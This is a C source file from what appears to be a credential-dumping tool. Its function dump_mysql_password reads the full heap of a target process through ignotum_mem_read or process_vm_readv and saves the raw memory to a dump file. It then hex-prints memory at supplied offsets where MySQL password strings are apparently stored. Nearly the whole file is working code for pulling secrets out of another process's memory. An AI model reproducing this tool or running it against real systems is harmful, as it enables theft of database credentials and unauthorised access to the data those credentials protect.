#define _GNU_SOURCE

#include <ignotum.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#include "dump-password.h"
#include "pretty-print.h"
#include "globals.h"
#include "heap.h"

ssize_t (*memreadfunc)(pid_t, void *, size_t, off_t) = ignotum_mem_read;
char *output_folder;

void dump_mysql_password(pid_t pid, off_t *offset){
    ignotum_mapinfo_t heap;
    char *output_file;

    size_t len, aux;
    ssize_t n;

    int fd;

    info("getting heap address of pid %d\n", pid);
    if(getheapmap(pid, &heap)){
        bad("failed to find the heap address\n");
        return;
    }

    good("heap = %lx-%lx\n", heap.start_addr, heap.end_addr);

    len = heap.end_addr - heap.start_addr;
    char *dump = malloc(heap.end_addr - heap.start_addr);
    if(dump == NULL){
        bad("malloc failed\n");
        return;
    }

    n = memreadfunc(pid, dump, len, heap.start_addr);
    if(n <= 0){
        bad("failed to read memory\n");
        free(dump);
        return;
    }

    good("%zd bytes read of %zu\n", n, len);

    if(output_folder){
        len = strlen(output_folder)+64;
        output_file = malloc(len);
        snprintf(output_file, len, "%s/%d-%lx-%lx.dump", output_folder,
            pid, heap.start_addr, heap.end_addr);

        fd = open(output_file, O_CREAT|O_TRUNC|O_RDWR, 0644);
        if(fd == -1){
            bad("failed open %s\n", output_file);
        } else {
            write(fd, dump, n);
            close(fd);

            good("heap saved to %s\n", output_file);
        }

        free(output_file);
    }

    while((aux = *offset++)){
        if(aux >= (size_t)n){
            bad("skipping offset 0x%lx, out of bounds\n", aux);
            continue;
        }

        good("string at offset 0x%lx:\n", aux);
        hdump(dump+aux, n-aux);
    }

    free(dump);
}

ssize_t xprocess_vm_readv(pid_t pid, void *out, size_t len, off_t addr){
    return process_vm_readv(pid,
        &(struct iovec){ .iov_base = out, .iov_len = len }, 1,
        &(struct iovec){ .iov_base = (void*)addr, .iov_len = len }, 1, 0);
}
